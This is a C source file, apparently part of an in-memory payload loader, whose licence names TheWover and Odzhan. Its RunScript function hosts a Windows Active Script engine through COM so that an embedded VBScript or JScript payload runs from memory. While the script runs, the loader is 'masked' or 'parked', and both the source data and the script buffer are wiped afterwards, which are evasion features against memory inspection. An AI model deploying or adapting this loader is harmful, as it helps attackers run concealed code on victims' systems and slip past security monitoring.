/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

VOID RunScript(PFRITTER_INSTANCE inst, PFRITTER_MODULE mod) {
    HRESULT                     hr;
    IActiveScriptParse          *parser;
    IActiveScript               *engine;
    MyIActiveScriptSite         mas;
    IActiveScriptSiteVtbl       activescript_vtbl;
    IActiveScriptSiteWindowVtbl siteWnd_vtbl;
    IHostVtbl                   wscript_vtbl;
    PWCHAR                      script;
    ULONG64                     len;
    BSTR                        obj;
    WCHAR                       buf[FRITTER_MAX_NAME+1];

    SIZE_T                      script_cb;
    BOOL                        masked;
    typedef HRESULT (STDMETHODCALLTYPE *ParseText_t)(PVOID, LPCOLESTR, LPCOLESTR, PVOID, LPCOLESTR,
                                                     DWORDLONG, ULONG, DWORD, PVOID, PVOID);
    typedef HRESULT (STDMETHODCALLTYPE *SetState_t)(PVOID, SCRIPTSTATE);

    // 1. Allocate memory for unicode format of script.
    // Sized from the DECOMPRESSED length (mod->len), never from the
    // compressed module size. A single-byte source char never yields more than one WCHAR, so
    // mod->len + 1 WCHARs always fits, including the terminator.
    script_cb = ((SIZE_T)mod->len + 1) * sizeof(WCHAR);

    script = (PWCHAR)inst->api.VirtualAlloc(
        NULL,
        script_cb,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if(script != NULL) {
      // 2. Convert string to unicode. Explicit source length: mod->data is
      // not guaranteed to be NUL-terminated. The output buffer is zero-filled
      // by VirtualAlloc and one WCHAR larger than the maximum output, so the
      // result is always terminated.
      inst->api.MultiByteToWideChar(CP_ACP, 0, (LPCCH)mod->data,
        (int)mod->len, script, (int)mod->len);
      Memset(mod->data, 0, mod->len);   // only the converted copy is used

      // setup the IActiveScriptSite interface
      mas.site.lpVtbl = (IActiveScriptSiteVtbl*)&activescript_vtbl;
      ActiveScript_New(inst, &mas.site);

      // setup the IActiveScriptSiteWindow interface for GUI stuff
      mas.siteWnd.lpVtbl = (IActiveScriptSiteWindowVtbl*)&siteWnd_vtbl;
      ActiveScriptSiteWindow_New(inst, &mas.siteWnd);

      // setup the IHost interface for WScript object
      mas.wscript.lpVtbl = (IHostVtbl*)&wscript_vtbl;
      Host_New(inst, &mas.wscript);

      // 4. Initialize COM, MyIActiveScriptSite
      DPRINT("CoInitializeEx");
      hr = inst->api.CoInitializeEx(NULL, COINIT_MULTITHREADED);

      if(hr == S_OK) {
        // 5. Instantiate the active script engine
        DPRINT("CoCreateInstance(IID_IActiveScript)");

        hr = inst->api.CoCreateInstance(
          &inst->xCLSID_ScriptLanguage, 0,
          CLSCTX_INPROC_SERVER | CLSCTX_INPROC_HANDLER,
          &inst->xIID_IActiveScript, (void **)&engine);

        if(hr == S_OK) {
          // 6. Get IActiveScriptParse object from engine
          DPRINT("IActiveScript::QueryInterface(IActiveScriptParse)");

          hr = engine->lpVtbl->QueryInterface(
            engine,
            &inst->xIID_IActiveScriptParse64,
            (void **)&parser);

          if(hr == S_OK) {
            // 7. Initialize parser
            DPRINT("IActiveScriptParse::InitNew");
            hr = parser->lpVtbl->InitNew(parser);

            if(hr == S_OK) {
              // 8. Set custom script interface
              DPRINT("IActiveScript::SetScriptSite");
              mas.wscript.lpEngine = engine;

              hr = engine->lpVtbl->SetScriptSite(
                engine, (IActiveScriptSite *)&mas);

              if(hr == S_OK) {
                DPRINT("IActiveScript::AddNamedItem(\"%s\")", inst->wscript);
                ansi2unicode(inst, inst->wscript, buf);
                obj = inst->api.SysAllocString(buf);
                hr = engine->lpVtbl->AddNamedItem(engine, (LPCOLESTR)obj, SCRIPTITEM_ISVISIBLE);
                inst->api.SysFreeString(obj);

                if(hr == S_OK) {
                  // With a mask stub the loader is masked while the engine
                  // runs; the engine reaches the host methods through the
                  // stub's inbound thunks. Otherwise the loader is parked:
                  // the methods are resident code and call no protected
                  // loader function.
                  masked = (MaskBase(inst) != NULL);
                  if(!masked) ParkLoader(inst, PARK_CODE);

                  // 9. Load script
                  DPRINT("IActiveScriptParse::ParseScriptText");
                  hr = ((ParseText_t)MaskCall(inst, (PVOID)parser->lpVtbl->ParseScriptText))(
                    parser, (LPCOLESTR)script, NULL, NULL, NULL, 0, 0, 0, NULL, NULL);

                  if(hr == S_OK) {
                    // 10. Run script
                    DPRINT("IActiveScript::SetScriptState(SCRIPTSTATE_CONNECTED)");
                    hr = ((SetState_t)MaskCall(inst, (PVOID)engine->lpVtbl->SetScriptState))(
                      engine, SCRIPTSTATE_CONNECTED);

                    // SetScriptState blocks here
                  }
                  if(!masked) ParkLoader(inst, PARK_OFF);
                }
              }
            }
            DPRINT("IActiveScriptParse::Release");
            parser->lpVtbl->Release(parser);
          }
          DPRINT("IActiveScript::Close");
          engine->lpVtbl->Close(engine);

          DPRINT("IActiveScript::Release");
          engine->lpVtbl->Release(engine);
        }
      }
      DPRINT("Erasing script from memory");
      Memset(script, 0, (DWORD)script_cb);

      DPRINT("VirtualFree(script)");
      inst->api.VirtualFree(script, 0, MEM_RELEASE);
    }
}

#include "activescript.c"
#include "wscript.c"
